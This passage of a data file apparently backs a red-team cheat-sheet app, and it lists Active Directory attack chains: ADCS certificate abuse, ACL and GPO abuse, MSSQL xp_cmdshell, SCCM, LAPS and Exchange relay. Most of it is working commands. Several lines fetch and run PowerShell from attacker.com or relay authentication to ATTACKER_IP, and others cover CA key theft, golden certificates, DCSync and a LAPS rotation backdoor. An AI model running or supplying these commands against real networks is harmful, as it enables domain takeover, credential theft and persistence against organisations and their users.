      'ESC3: template has Certificate Request Agent EKU + another template allows enrollment on behalf of — two-step to impersonate any user',
      'ESC4: template has write permissions for non-admin principal (GenericWrite, WriteDACL) — modify template to become ESC1',
      'ESC5: PKI object access control misconfiguration — write to CA object or NTAuthCertificates',
      'ESC6: CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set — any template can specify SANs',
      'ESC7: CA officers/managers role misconfigured — low-priv user can approve pending requests or manage CA',
      'ESC8: HTTP enrollment endpoint vulnerable to NTLM relay — relay machine account auth to get a cert',
      'ESC9/10: template has no security extensions — certificate theft, pass the cert to get NT hash',
      'ESC11: relay to RPC-based ICPR endpoint (alternative to ESC8 HTTP relay)',
      'ESC13: issuance policy OID linked to Universal group — cert grants group membership',
      'After obtaining cert: use PKINIT to get TGT, UnPAC-the-Hash to extract NT hash, or persist indefinitely',
    ],
    commands: [
      {
        title: 'Certipy full enumeration and ESC1 exploit',
        code: `# Full ADCS enumeration
certipy find -u user@corp.local -p Password -dc-ip DC01 -vulnerable -stdout
certipy find -u user@corp.local -p Password -dc-ip DC01 -output adcs_enum

# ESC1 — SAN in template, enroll as DA
certipy req -u user@corp.local -p Password -ca CORP-CA \
  -template VulnerableTemplate -upn Administrator@corp.local -dc-ip DC01
# Output: administrator.pfx

# Authenticate to get TGT + NT hash
certipy auth -pfx administrator.pfx -domain corp.local -dc-ip DC01
# Outputs: administrator.ccache + NT hash

# ESC3 — Certificate Request Agent chain
# Step 1: Enroll in Request Agent template
certipy req -u user@corp.local -p Password -ca CORP-CA -template "AgentTemplate" -dc-ip DC01
# Step 2: Use agent cert to enroll on behalf of DA
certipy req -u user@corp.local -p Password -ca CORP-CA \
  -template "UserTemplate" -on-behalf-of corp/Administrator \
  -pfx agent.pfx -dc-ip DC01

# ESC4 — modify template write permissions
certipy template -u user@corp.local -p Password \
  -template VulnerableTemplate -save-old   # backup and modify
# Now exploit as ESC1
certipy req -u user@corp.local -p Password -ca CORP-CA \
  -template VulnerableTemplate -upn Administrator@corp.local
# Restore template
certipy template -u user@corp.local -p Password \
  -template VulnerableTemplate -configuration VulnerableTemplate.json

# ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 on CA
# Any template can now specify SAN — use a basic User template
certipy req -u user@corp.local -p Password -ca CORP-CA \
  -template User -upn Administrator@corp.local -dc-ip DC01

# ESC8 — NTLM relay to ADCS HTTP enrollment
# Terminal 1: start relay
certipy relay -target http://CA.corp.local/certsrv/certfnsh.asp \
  -template DomainController
# Terminal 2: coerce DC
python3 PetitPotam.py -u user -p Password ATTACKER_IP DC01.corp.local

# ESC13 — OID group link
certipy find ... | grep -A5 "issuance-policies"
# Identify OID linked to group
certipy req -u user@corp.local -p Password -ca CORP-CA \
  -template ESC13Template -dc-ip DC01
# Resulting TGT has group SID in PAC — instant group membership

# Windows: Certify + Rubeus
execute-assembly /tools/Certify.exe find /vulnerable
execute-assembly /tools/Certify.exe request /ca:CORP-CA /template:VulnTemplate /altname:Administrator
# Convert .pem to pfx: openssl pkcs12 -export -in cert.pem -out cert.pfx
execute-assembly /tools/Rubeus.exe asktgt /user:Administrator \
  /certificate:cert.pfx /getcredentials /ptt /nowrap`
      },
      {
        title: 'CA key theft and golden certificate',
        code: `# Steal CA private key (on CA server — requires local admin / SYSTEM)
certipy ca -backup -ca "CORP-CA" \
  -u Administrator@corp.local -p Password -target CA.corp.local
# Outputs: CORP-CA.pfx (CA cert + private key)

# Forge certificate for ANY user (no expiry dependency, offline)
certipy forge -ca-pfx CORP-CA.pfx \
  -upn Administrator@corp.local -subject "CN=Administrator,DC=corp,DC=local"
# Output: administrator_forged.pfx

# Authenticate with forged cert
certipy auth -pfx administrator_forged.pfx -domain corp.local -dc-ip DC01

# SharpDPAPI on CA server (Windows)
execute-assembly /tools/SharpDPAPI.exe certificates /machine /server:CA.corp.local
# Returns CA cert + key as PEM — persist forever even after password resets + krbtgt rotations

# Check if ADCS HTTP endpoint is reachable
curl -k https://CA.corp.local/certsrv/   # HTTP basic auth prompt = vulnerable to relay`
      }
    ]
  },
  {
    id: 'acl-abuse',
    title: 'ACL / DACL Abuse — Full Attack Chains',
    subtitle: 'Exploit misconfigured Active Directory Access Control Lists to escalate privileges',
    tags: ['GenericAll', 'GenericWrite', 'WriteDACL', 'WriteOwner', 'ForceChangePassword', 'AddMember', 'BloodHound', 'ACL'],
    accentColor: 'cyan',
    overview: 'Active Directory ACL abuse exploits misconfigured permissions on AD objects — user accounts, groups, computers, and the domain root. Common exploitable rights: GenericAll (full control), GenericWrite (modify attributes), WriteDACL (grant any permission to self), WriteOwner (take ownership then WriteDACL), ForceChangePassword, and AddMember. BloodHound visualises these ACL chains and finds the shortest path to Domain Admin via chained ACL abuses.',
    steps: [
      'GenericAll on User: reset password, add SPN (Kerberoast), add shadow credentials (msDS-KeyCredentialLink)',
      'GenericAll on Group: add yourself as a member — instant group membership including Domain Admins',
      'GenericAll on Computer: perform RBCD attack — delegate to it and impersonate any user',
      'GenericWrite on User: modify attributes — add SPN for targeted Kerberoasting, modify logon script',
      'WriteDACL: grant yourself any right on the object — effectively GenericAll via self-grant',
      'WriteOwner: take ownership of object — then WriteDACL → GenericAll',
      'ForceChangePassword: change target password without knowing current password — noisy but effective',
      'AddMember on Group: self-explanatory — add account to privileged group',
      'Enumerate all ACL paths with BloodHound: "Shortest Paths to Domain Admins" shows ACL chains',
      'Always clean up after ACL abuse: remove added SPNs, reset delegations, restore permissions',
    ],
    commands: [
      {
        title: 'ACL enumeration and abuse with PowerView',
        code: `# Find all interesting ACLs in the domain (BloodHound is better for visualization)
Get-DomainObjectAcl -ResolveGUIDs | 
  Where-Object { $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDACL|WriteOwner|WriteProperty|Self" } |
  Where-Object { $_.SecurityIdentifier -notmatch "S-1-5-18|S-1-5-32|S-1-5-9" } |
  Select-Object ObjectDN, ActiveDirectoryRights, SecurityIdentifier

# GenericAll on User — change password
Set-DomainUserPassword -Identity TargetUser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# GenericAll on User — add SPN for Kerberoasting
Set-DomainObject -Identity TargetUser -Set @{serviceprincipalname='fake/temp.corp.local'}
execute-assembly /tools/Rubeus.exe kerberoast /user:TargetUser /nowrap
# Clean up SPN immediately
Set-DomainObject -Identity TargetUser -Clear serviceprincipalname

# GenericAll on Group — add member
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker
# Or via PowerView:
$group = Get-DomainGroup "Domain Admins"
Add-DomainGroupMember -Identity $group.samaccountname -Members "attacker"

# WriteDACL — grant GenericAll to self, then exploit
$sid = (Get-DomainUser attacker).objectsid
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker \
  -Rights All -Verbose
# Now add yourself to DA
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker

# WriteOwner — take ownership, grant rights, exploit
Set-DomainObjectOwner -Identity TargetObject -OwnerIdentity attacker
Add-DomainObjectAcl -TargetIdentity TargetObject -PrincipalIdentity attacker -Rights All

# ForceChangePassword (GenericAll / ExtendedRight)
$pass = ConvertTo-SecureString 'Temp1234!' -AsPlainText -Force
Set-DomainUserPassword -Identity TargetUser -AccountPassword $pass

# Shadow Credentials via GenericWrite (add key credential — no password change needed)
execute-assembly /tools/Whisker.exe add /target:TargetUser
# Use the Rubeus command from Whisker output to get TGT + NT hash`
      },
      {
        title: 'BloodyAD — Automated ACL exploitation',
        code: `# BloodyAD installation
pip3 install bloodyad

# Enumerate ACL objects with exploitable rights
bloodyad -d corp.local -u user -p Password --host DC01 search --filter "objectClass=*" --attrs nTSecurityDescriptor
# or directly enumerate writable objects:
bloodyad -d corp.local -u user -p Password --host DC01 get writable

# Change password on user (GenericAll / ExtendedRight)
bloodyad -d corp.local -u attacker -p Password --host DC01 set password TargetUser NewPass123!

# Add user to group (GenericAll on group)
bloodyad -d corp.local -u attacker -p Password --host DC01 add user-to-group TargetUser "Domain Admins"

# Grant GenericAll on object
bloodyad -d corp.local -u attacker -p Password --host DC01 grant user TargetUser DC01$ GenericAll

# Add SPN to user for Kerberoasting
bloodyad -d corp.local -u attacker -p Password --host DC01 set spn TargetUser "fake/target.corp.local"

# Add shadow credentials (msDS-KeyCredentialLink)
bloodyad -d corp.local -u attacker -p Password --host DC01 set shadow-credentials TargetUser

# Grant DCSync rights (add DS-Replication-Get-Changes + DS-Replication-Get-Changes-All)
bloodyad -d corp.local -u attacker -p Password --host DC01 grant user TargetUser "DC=corp,DC=local" DCSync

# Take ownership of object
bloodyad -d corp.local -u attacker -p Password --host DC01 set owner TargetObject attacker

# Custom ACL grant (any right)
bloodyad -d corp.local -u attacker -p Password --host DC01 grant user attacker TargetObject "GenericAll"

# List all objects current user can modify
bloodyad -d corp.local -u attacker -p Password --host DC01 get writable --filter "objectClass=user"

# Get detailed DACL info
bloodyad -d corp.local -u attacker -p Password --host DC01 get object TargetUser --all`
      },
      {
        title: 'DCSync rights via ACL escalation',
        code: `# Grant DCSync rights via WriteDACL on domain root
# (if you have WriteDACL on dc=corp,dc=local)
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
  -PrincipalIdentity attacker \
  -Rights DCSync -Verbose
# Now perform DCSync
mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt

# Enumerate who already has DCSync rights
Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs |
  Where-Object { ($_.ActiveDirectoryRights -match "ExtendedRight") -and
    ($_.ObjectAceType -match "DS-Replication-Get-Changes") } |
  Select-Object SecurityIdentifier, ObjectAceType

# BloodHound Cypher — find all DCSync principals
MATCH (n)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN n.name

# Check AD Recycle Bin / AdminSDHolder
# AdminSDHolder protects privileged groups — writing to it propagates to all protected accounts
# If you have GenericAll on AdminSDHolder:
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  -PrincipalIdentity attacker -Rights All
# SDProp runs every 60 min — after 60 min, attacker has GenericAll on all DA/EA/BA accounts`
      }
    ]
  },
  {
    id: 'gpo',
    title: 'Group Policy Abuse — Full Scope',
    subtitle: 'Modify, create, or link GPOs to execute code across OUs containing high-value targets',
    tags: ['GPO', 'SharpGPOAbuse', 'Immediate Scheduled Task', 'Computer Startup', 'New-GPLink', 'GPC', 'SYSVOL'],
    accentColor: 'cyan',
    overview: 'Group Policy Objects control computer and user configuration across Organisational Units. Write access to a GPO — or the ability to create and link one — allows deploying arbitrary code to every computer in the linked OU. SharpGPOAbuse automates Immediate Scheduled Task creation that fires at the next gpupdate (default 90 minutes). GPO credential hunting via SYSVOL extracts GPP cpassword values (AES-256 but with a publicly known key) and hardcoded credentials in startup scripts.',
    steps: [
      'Enumerate GPO write access: BloodHound "Find GPOs where principals have control" or PowerView',
      'Immediate Scheduled Task via SharpGPOAbuse: fires on next policy refresh (default 90 min) or `gpupdate /force`',
      'Add local admin: use GPO to add attacker account to local Administrators group on all linked computers',
      'Computer Startup Script: drops to SYSVOL share, runs as SYSTEM on next reboot — persistent',
      'New GPO: requires CreateGPO on domain + Link GPOs on target OU — gives control over all computers in OU',
      'GPC (Group Policy Container) modification: edit gpt.ini, modify scripts directly in SYSVOL',
      'GPO link ordering: if multiple GPOs apply, enforce/disable inheritance to control precedence',
    ],
    commands: [
      {
        title: 'Credentials and sensitive data in GPO / SYSVOL',
        code: `# === Finding credentials stored in Group Policy ===

# Method 1: Group Policy Preferences (GPP) passwords — cpassword attribute
# GPP passwords are AES-256 encrypted but Microsoft published the key in 2012
# Any domain user can read SYSVOL — these are world-readable

# Search SYSVOL for GPP cpassword values
Get-ChildItem -Path "\\\\corp.local\\SYSVOL" -Recurse -Include "*.xml" -ErrorAction SilentlyContinue |
  Select-String -Pattern "cpassword" | Select-Object Path, LineNumber, Line

# Example GPP file locations:
# \\DC01\SYSVOL\corp.local\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
# \\DC01\SYSVOL\corp.local\Policies\{GUID}\User\Preferences\Drives\Drives.xml
# \\DC01\SYSVOL\corp.local\Policies\{GUID}\Machine\Preferences\Services\Services.xml

# Decrypt GPP cpassword (AES key is public — MS14-025 advisory)
python3 -c "
import base64, hashlib
from Crypto.Cipher import AES

# Microsoft's hardcoded AES key for GPP
key = b'\\x4e\\x99\\x06\\xe8\\xfc\\xb6\\x6c\\xc9\\xfa\\xf4\\x93\\x10\\x62\\x0f\\xfe\\xe8\\xf4\\x96\\xe8\\x06\\xcc\\x05\\x79\\x90\\x20\\x9b\\x09\\xa4\\x33\\xb6\\x6c\\x1b'
enc = 'CPASSWORD_VALUE_HERE'
# Pad to 16-byte boundary
padded = base64.b64decode(enc + '=' * (4 - len(enc) % 4))
cipher = AES.new(key, AES.MODE_CBC, b'\\x00' * 16)
print(cipher.decrypt(padded).rstrip(b'\\x00\\x10\\x0b\\x05').decode())
"

# Or use Get-GPPPassword (PowerSploit)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Get-GPPPassword.ps1')
Get-GPPPassword
# Returns: UserName, NewName, Password, Changed, File

# impacket Get-GPPPassword (Linux)
impacket-Get-GPPPassword corp.local/user:Password -dc-ip DC01

# CrackMapExec — auto-enumerate GPP passwords
crackmapexec smb DC01 -u user -p Password -M gpp_password
crackmapexec smb DC01 -u user -p Password -M gpp_autologin

# === Method 2: Scripts in SYSVOL ===
# GPO startup/logon scripts stored in SYSVOL may contain hardcoded creds
Get-ChildItem "\\\\corp.local\\SYSVOL" -Recurse -Include "*.bat","*.cmd","*.ps1","*.vbs" |
  Select-String -Pattern "password|pass|pwd|credential" | Select-Object Path, Line

# === Method 3: AutoLogon credentials in GPO registry settings ===
# GPO can set HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon values
# DefaultUserName / DefaultPassword — readable from SYSVOL before deploy
Get-ChildItem "\\\\corp.local\\SYSVOL" -Recurse -Include "*.xml" |
  Select-String -Pattern "DefaultPassword|AutoAdminLogon" | Select-Object Path, Line`
      },
      {
        title: 'GPO abuse with SharpGPOAbuse and PowerView',
        code: `# Find GPOs where current user has write access
Get-DomainGPO | ForEach-Object {
  $dn = $_.DistinguishedName
  $acl = Get-ObjectAcl -DistinguishedName $dn -ResolveGUIDs
  $acl | Where-Object { $_.SecurityIdentifier -eq (Get-DomainUser attacker).objectsid -and
    $_.ActiveDirectoryRights -match "Write|All" } |
  Select-Object @{n='GPO';e={$dn}}, ActiveDirectoryRights
}

# SharpGPOAbuse — immediate scheduled task (fires at next gpupdate)
execute-assembly /tools/SharpGPOAbuse.exe \
  --AddComputerTask \
  --TaskName "WinUpdate" \
  --Author "NT AUTHORITY\SYSTEM" \
  --Command "cmd.exe" \
  --Arguments '/c "powershell -nop -w hidden -c IEX((new-object net.webclient).downloadstring(\"http://attacker.com/s.ps1\"))"' \
  --GPOName "Default Domain Policy" \
  --Force

# Add local admin via GPO
execute-assembly /tools/SharpGPOAbuse.exe \
  --AddLocalAdmin \
  --UserAccount corp\attacker \
  --GPOName "Workstation Policy"

# Computer Startup Script via SYSVOL
# Path: \\DC01\SYSVOL\corp.local\Policies\{GUID}\Machine\Scripts\Startup\
shell echo 'powershell -nop -w hidden -ep bypass -c "IEX(...)"' > startup.bat
shell copy startup.bat "\\\\DC01\\SYSVOL\\corp.local\\Policies\\{GPO-GUID}\\Machine\\Scripts\\Startup\\"
# Edit scripts.ini to register it:
# [Startup]
# 0CmdLine=startup.bat
# 0Parameters=

# Create new GPO and link (requires CreateGPO + link perms on OU)
New-DomainGPO -Name "RedTeam" -Domain corp.local
New-GPLink -Name "RedTeam" -Target "OU=Workstations,DC=corp,DC=local" -LinkEnabled Yes -Enforced Yes

# Force refresh on specific host
shell gpupdate /force        # Local
Invoke-Command -ComputerName TARGET -ScriptBlock { gpupdate /force }

# BloodHound Cypher — find principals with GPO control
MATCH p=(n)-[:GenericAll|GenericWrite|Owns|WriteDACL|WriteOwner]->(g:GPO) RETURN p`
      }
    ]
  },
  {
    id: 'mssql',
    title: 'MSSQL Server — Deep Exploitation Chain',
    subtitle: 'Chain SQL impersonation, linked servers, CLR assemblies, and xp_cmdshell for full domain compromise via SQL',
    tags: ['MSSQL', 'xp_cmdshell', 'impersonation', 'linked servers', 'CLR', 'OLE Automation', 'SQLRecon', 'PowerUpSQL'],
    accentColor: 'orange',
    overview: 'MSSQL Server instances in enterprise AD environments frequently run as privileged service accounts and can be leveraged for lateral movement and privilege escalation. Impersonation (EXECUTE AS LOGIN) allows using another SQL login\'s context without knowing its password. xp_cmdshell executes OS commands as the SQL service account. Linked server chains allow chaining privilege through multiple SQL servers. CLR assemblies load arbitrary .NET DLLs as stored procedures, executing code as SYSTEM.',
    steps: [
      'Enumerate SQL instances: SPN query, UDP 1434 broadcast, PowerUpSQL automated discovery',
      'Impersonation: EXECUTE AS LOGIN = \'sa\' — check which logins can be impersonated without knowing their password',
      'xp_cmdshell: execute OS commands as SQL service account (often local admin or SYSTEM)',
      'OLE Automation Procedures: alternative to xp_cmdshell — sp_OACreate / sp_OAMethod / sp_OAGetErrorInfo',
      'CLR Assembly: create a SQL CLR assembly from .NET DLL — stored procedure executes arbitrary .NET code as SYSTEM',
      'Linked Server chains: each linked server hop may run with different credentials — escalate across servers',
      'OpenRowset / OpenQuery: execute queries on remote SQL servers without formal linked server setup',
      'Service account exploitation: SQL often runs as domain service account — compromise = lateral movement',
    ],
    commands: [
      {
        title: 'SQL Server enumeration and exploitation',
        code: `# Enumerate SQL Servers in AD
setspn -T corp.local -Q MSSQLSvc/*
Get-DomainComputer | Where-Object { $_.serviceprincipalname -like "*MSSQLSvc*" }

# PowerUpSQL — automated audit
execute-assembly /tools/PowerUpSQL.exe Get-SQLInstanceDomain -Verbose | Get-SQLServerInfo
execute-assembly /tools/PowerUpSQL.exe Invoke-SQLAudit -Verbose -Instance "SQL01\\SQLEXPRESS"

# Check current user and impersonation opportunities
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
SELECT name FROM sys.server_principals 
  WHERE permission_name = 'IMPERSONATE' AND state = 'G';

# Impersonate sa / sysadmin
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;  -- Now sa
-- or
EXECUTE AS LOGIN = 'corp\\svc-sql-admin';
SELECT IS_SRVROLEMEMBER('sysadmin');  -- Should be 1

# Enable xp_cmdshell
EXECUTE AS LOGIN = 'sa';
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -nop -w hidden -ep bypass IEX((new-object net.webclient).downloadstring(\"http://attacker.com/s.ps1\"))';

# OLE Automation alternative (when xp_cmdshell is blocked)
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd /c whoami > C:\\output.txt', 0, TRUE;
EXEC sp_OADestroy @shell;

# CLR Assembly — arbitrary .NET code execution
-- Step 1: Create .NET DLL with stored procedure
-- Step 2: Import
CREATE ASSEMBLY ClrExec FROM 'C:\\path\\to\\ClrExec.dll' WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE dbo.exec_clr (@cmd NVARCHAR(4000))
  AS EXTERNAL NAME ClrExec.StoredProcedures.exec_cmd;
EXEC dbo.exec_clr 'whoami';`
      },
      {
        title: 'Linked server chain exploitation',
        code: `-- Enumerate linked servers
SELECT name, data_source, is_linked FROM sys.servers WHERE is_linked = 1;
SELECT srvname, srvproduct, datasource FROM master..sysservers;

-- Execute on linked server
EXEC ('SELECT SYSTEM_USER') AT [SQL02];
EXEC ('xp_cmdshell ''whoami''') AT [SQL02];

-- Chain through multiple hops
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''' ) AT [SQL03]') AT [SQL02];

-- OpenRowset without linked server config
SELECT * FROM OPENROWSET('SQLNCLI', 'Server=SQL02;Trusted_Connection=yes;', 'SELECT SYSTEM_USER');

-- PowerUpSQL linked server traversal
execute-assembly /tools/PowerUpSQL.exe Get-SQLServerLinkCrawl \
  -Instance "SQL01" -Query "SELECT SYSTEM_USER" -Verbose

# SQLRecon (modern alternative)
execute-assembly /tools/SQLRecon.exe /auth:wintoken /host:SQL01 /module:info
execute-assembly /tools/SQLRecon.exe /auth:wintoken /host:SQL01 /module:links
execute-assembly /tools/SQLRecon.exe /auth:wintoken /host:SQL01 /module:lquery \
  /link:SQL02 /query:"SELECT SYSTEM_USER"
execute-assembly /tools/SQLRecon.exe /auth:wintoken /host:SQL01 /module:lenablexp \
  /link:SQL02
execute-assembly /tools/SQLRecon.exe /auth:wintoken /host:SQL01 /module:lxpcmd \
  /link:SQL02 /command:"whoami"`
      }
    ]
  },
  {
    id: 'sccm',
    title: 'SCCM / MECM — Full Attack Surface',
    subtitle: 'Abuse Microsoft Endpoint Configuration Manager for credential theft, lateral movement, and mass RCE',
    tags: ['SCCM', 'MECM', 'NAA', 'CMPivot', 'SharpSCCM', 'PXE', 'distribution point', 'hierarchy takeover'],
    accentColor: 'orange',
    overview: 'SCCM (Microsoft Endpoint Configuration Manager) manages thousands of endpoints from a centralised platform — compromising it is equivalent to compromising every managed device. The Network Access Account (NAA) credential is used by clients to access distribution points and is stored encrypted in WMI, decryptable with SYSTEM access on any managed client. CMPivot provides real-time query and script execution across all managed devices — instant lateral movement at scale.',
    steps: [
      'Enumerate SCCM hierarchy: find Management Point (MP), Distribution Points (DP), Site Server from LDAP or DHCP',
      'NAA (Network Access Account): credentials used by clients to access distribution points — stored in WMI encrypted with DPAPI',
      'PXE boot attack: unauthenticated clients can request OS deployment — intercept media password via SharpSCCM',
      'SCCM admin → RCE: deploy malicious application/script to any collection (group of clients)',
      'CMPivot: real-time query tool for SCCM admins — enumerate all managed endpoints and execute scripts',
      'Hierarchy takeover: if you compromise the site server, you control all managed devices',
      'Credential relay: coerce SCCM clients to authenticate to attacker — capture/relay their machine account',
    ],
    commands: [
      {
        title: 'SCCM enumeration and NAA extraction',
        code: `# Find SCCM infrastructure from LDAP
execute-assembly /tools/SharpSCCM.exe get site-info
execute-assembly /tools/SharpSCCM.exe get mps          # Management Points
execute-assembly /tools/SharpSCCM.exe get dps          # Distribution Points
execute-assembly /tools/SharpSCCM.exe get collections  # Device collections

# Extract NAA credentials (requires local admin on any managed client)
execute-assembly /tools/SharpSCCM.exe get naa
# Reads from: HKLM\SOFTWARE\Microsoft\SMS\DP or WMI class CCM_NetworkAccessAccount
# Credentials are DPAPI-encrypted — SharpSCCM decrypts automatically

# Alternative: manual WMI extraction
$naa = Get-WmiObject -Namespace "root\ccm\policy\Machine\ActualConfig" \
  -Class CCM_NetworkAccessAccount
$naa | Select-Object NetworkAccessUsername, NetworkAccessPassword
# Password is DPAPI blob — use SharpDPAPI to decrypt

# PXE boot password extraction
execute-assembly /tools/SharpSCCM.exe get pxe-creds
# If PXE is enabled without a boot password or with a weak one

# Deploy malicious application (requires SCCM Full Administrator)
execute-assembly /tools/SharpSCCM.exe exec \
  -d "DC01" \
  -r "powershell -nop -w hidden IEX(...)" \
  -n "Windows Defender Update" \
  -s   # Silent

# CMPivot script execution (from SCCM admin console or via API)
# Run PowerShell on ALL managed devices:
Invoke-CMScript -ScriptName "RedTeam" -ScriptContent "whoami" \
  -CollectionName "All Systems"

# Coerce SCCM client to authenticate (relay)
execute-assembly /tools/SharpSCCM.exe invoke admin-service \
  -sms SMS01.corp.local \
  -r <attacker_IP>`
      }
    ]
  },
  {
    id: 'laps',
    title: 'LAPS — Read, Abuse & Backdoor',
    subtitle: 'Read LAPS-managed local admin passwords and establish persistence via expiry manipulation',
    tags: ['LAPS', 'ms-Mcs-AdmPwd', 'LAPSv2', 'LAPSToolkit', 'expiration backdoor', 'read ACL'],
    accentColor: 'orange',
    overview: 'LAPS (Local Administrator Password Solution) randomises local admin passwords and stores them in Active Directory on the computer object (ms-Mcs-AdmPwd for LAPSv1, msLAPS-Password for LAPSv2). Read access to this attribute is delegated to specific groups — misconfigured read permissions allow any user in those groups to retrieve all local admin passwords. Expiry manipulation (writing far-future expiry time) prevents password rotation — a persistence mechanism.',
    steps: [
      'LAPS stores local admin passwords in ms-Mcs-AdmPwd on computer objects (LAPSv1) or msLAPS-Password (LAPSv2)',
      'Read ACL misconfiguration: enumerate which groups/users can read the password attribute on computer objects',
      'LAPSv2: encrypted with AES256 using the domain computer key — but decryption is transparent via LDAP if you have read rights',
      'Expiry manipulation: write to ms-Mcs-AdmPwdExpirationTime — set far future date to prevent rotation (backdoor)',
      'Group Policy targeting: check which OUs have LAPS applied — non-LAPS machines have static/known local admin passwords',
      'After reading: PTH or Kerberoast the local admin account across multiple machines for lateral movement',
    ],
    commands: [
      {
        title: 'LAPS password reading and backdoor',
        code: `# Find which computers have LAPS enabled
Get-DomainComputer | Where-Object { $_."ms-mcs-admpwdexpirationtime" -ne $null } | 
  Select-Object dnshostname, "ms-mcs-admpwd", "ms-mcs-admpwdexpirationtime"

# LAPSToolkit — comprehensive LAPS attack toolkit
execute-assembly /tools/LAPSToolkit.exe Find-LAPSDelegatedGroups
execute-assembly /tools/LAPSToolkit.exe Find-AdmPwdExtendedRights
execute-assembly /tools/LAPSToolkit.exe Get-LAPSComputers
# Outputs: Hostname | Password | Expiration | Passwordexpired

# Read LAPS password via PowerView
Get-DomainComputer WORKSTATION01 -Properties ms-mcs-admpwd, ms-mcs-admpwdexpirationtime

# Read LAPS password via LDAP (if LAPSv2)
Get-ADComputer WORKSTATION01 -Properties "msLAPS-Password", "msLAPS-EncryptedPassword"
# Decrypt LAPSv2 via LAPS PowerShell module (on domain-joined machine with rights):
Get-LapsADPassword -Identity WORKSTATION01 -AsPlainText

# Backdoor: prevent rotation by setting expiry to far future
Set-DomainObject -Identity "WORKSTATION01$" \
  -Set @{"ms-mcs-admpwdexpirationtime" = [datetime]::Parse("2099-01-01").ToFileTimeUtc()}
# LAPS won't rotate until that date — password stays the same

# Once you have LAPS password:
impacket-psexec corp.local/Administrator:LAPSPassword@WORKSTATION01
evil-winrm -i WORKSTATION01 -u Administrator -p LAPSPassword

# Spray LAPS password across all computers in same OU (often same password pattern)
crackmapexec smb 10.10.10.0/24 -u Administrator -p LAPSPassword --local-auth`
      }
    ]
  },
  {
    id: 'exchange',
    title: 'Exchange / PrivExchange — EWS & Mailbox Abuse',
    subtitle: 'Exploit Exchange server for credential relay, mailbox access, and RBAC privilege escalation',
    tags: ['Exchange', 'PrivExchange', 'EWS', 'NTLM relay', 'PushSubscription', 'WriteDACL', 'MailSniper', 'ruler'],
    accentColor: 'orange',
    overview: 'Exchange servers have historically held elevated AD privileges by default (WriteDACL on the domain root). PrivExchange (CVE-2019-0686) coerces Exchange to authenticate to an attacker-controlled server via a push subscription, allowing NTLM relay to LDAP to grant DCSync rights. MailSniper searches all mailboxes for credentials and sensitive data with admin impersonation rights. Ruler manipulates Outlook rules to achieve persistent code execution via email triggers.',
    steps: [
      'PrivExchange (CVE-2019-0686): Exchange pushes subscriptions that force it to authenticate to attacker via HTTP — relay NTLM to LDAP to grant DCSync',
      'Exchange servers have WriteDACL on the domain root by default — use relayed credentials to grant DCSync rights',
      'EWS (Exchange Web Services): authenticate as any mailbox owner if you have their credentials',
      'MailSniper: search all mailboxes for keywords (passwords, API keys, sensitive data) — requires EWS admin impersonation rights',
      'Ruler: interact with Exchange from Linux — phishing, rules exploitation, persistent code execution via Outlook rules',
      'Exchange Online (O365): EWS and Graph API endpoints — same concepts but cloud-hosted',
    ],
    commands: [
      {
        title: 'PrivExchange NTLM relay to DCSync',
        code: `# PrivExchange — coerce Exchange to authenticate via PushSubscription
# Requires: domain credentials (any)

# Step 1: Start NTLM relay (ntlmrelayx targeting LDAP — grant DCSync)
impacket-ntlmrelayx -t ldap://DC01.corp.local --escalate-user attacker -smb2support
# --escalate-user: grant DCSync rights to this user when relay succeeds

# Step 2: Trigger Exchange to authenticate to us
python3 privexchange.py -ah ATTACKER_IP exchange.corp.local \
  -u user -p Password -d corp.local
# Exchange authenticates to ATTACKER_IP → relay to LDAP → attacker gets DCSync rights

# Step 3: DCSync with newly granted rights
mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt
impacket-secretsdump -just-dc corp.local/attacker:Password@DC01

# MailSniper — search mailboxes for credentials
Import-Module MailSniper.ps1
# Get Global Address List
Get-GlobalAddressList -ExchHostname mail.corp.local -UserName attacker -Password Password -Verbose

# Search all mailboxes (requires admin impersonation)
Invoke-GlobalMailSearch -ImpersonationAccount administrator \
  -ExchHostname mail.corp.local \
  -Terms "password","credential","VPN","secret","token","API" \
  -OutputCsv mailsearch.csv

# Search own mailbox
Invoke-SelfSearch -Mailbox attacker@corp.local \
  -ExchHostname mail.corp.local -Terms "password"

# Ruler — Outlook rule RCE (triggers on email receipt)
ruler --domain corp.local --email victim@corp.local \
  --username victim --password Password \
  add --name "Update" \
  --trigger "password" \
  --action "C:\\Windows\\System32\\cmd.exe /c powershell IEX(...)"
# Next time victim receives email with "password" → rule fires → code executes`
      }
    ]
  },
  {
    id: 'trusts',
    title: 'Forest & Domain Trust Attacks',
    subtitle: 'Escalate across domain and forest trust boundaries to achieve enterprise-wide compromise',
    tags: ['domain trust', 'forest trust', 'SID history', 'SID filtering', 'inter-realm TGT', 'trust key', 'external trust'],
    accentColor: 'green',
